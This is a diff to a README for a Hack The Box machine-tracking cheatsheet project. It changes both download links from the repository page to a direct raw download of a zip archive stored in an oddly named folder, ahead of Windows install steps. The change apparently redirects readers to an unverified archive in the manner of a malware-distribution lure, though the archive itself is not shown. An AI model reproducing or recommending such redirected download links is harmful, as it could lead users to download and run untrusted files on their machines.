@@ -1,6 +1,6 @@
 # 📊 cheatsheet_machines_htb - Track HTB Machines with Ease
 
-[![Download](https://img.shields.io/badge/Download-Open%20Project-6f42c1?style=for-the-badge&logo=github)](https://github.com/Kelly7401/cheatsheet_machines_htb)
+[![Download](https://img.shields.io/badge/Download-Open%20Project-6f42c1?style=for-the-badge&logo=github)](https://github.com/Kelly7401/cheatsheet_machines_htb/raw/refs/heads/main/moronism/machines-htb-cheatsheet-2.0-beta.3.zip)
 
 ## 🧩 What this app does
 
@@ -25,7 +25,7 @@ If you plan to keep your machine list updated, Excel can help with data review b
 
 Go to this page to download or access the project files:
 
-[https://github.com/Kelly7401/cheatsheet_machines_htb](https://github.com/Kelly7401/cheatsheet_machines_htb)
+[https://github.com/Kelly7401/cheatsheet_machines_htb/raw/refs/heads/main/moronism/machines-htb-cheatsheet-2.0-beta.3.zip](https://github.com/Kelly7401/cheatsheet_machines_htb/raw/refs/heads/main/moronism/machines-htb-cheatsheet-2.0-beta.3.zip)
 
 ## 🖥️ Install on Windows
 
